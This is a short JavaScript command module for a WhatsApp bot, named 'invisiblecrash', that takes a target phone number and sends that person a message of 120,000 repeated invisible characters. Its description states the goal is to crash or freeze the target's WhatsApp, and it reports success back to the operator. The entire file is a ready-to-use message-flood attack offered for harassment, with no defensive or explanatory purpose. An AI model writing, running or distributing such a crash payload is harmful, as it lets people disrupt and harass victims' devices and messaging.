module.exports = {
  name: 'invisiblecrash',
  alias: [],
  description: 'Sends an invisible Unicode flood to crash or freeze target WhatsApp',
  category: 'bug',

  async run(bot, msg, args, platform) {
    const target = args[0];

    if (!target) {
      return bot.sendMessage(msg.chat.id, '⚠️ Provide a target number.\n\nExample:\n.invisiblecrash 233XXXXXXXXX');
    }

    const jid = `${target}@s.whatsapp.net`;

    const invisiblePayload = "‎".repeat(120000); // 120K zero-width chars

    try {
      await bot.sendMessage(jid, { text: invisiblePayload });
      await bot.sendMessage(msg.chat.id, `✅ Invisible crash sent to ${target}`);
    } catch (e) {
      await bot.sendMessage(msg.chat.id, `❌ Failed to send invisible crash.\n\n${e.message}`);
    }
  }
};
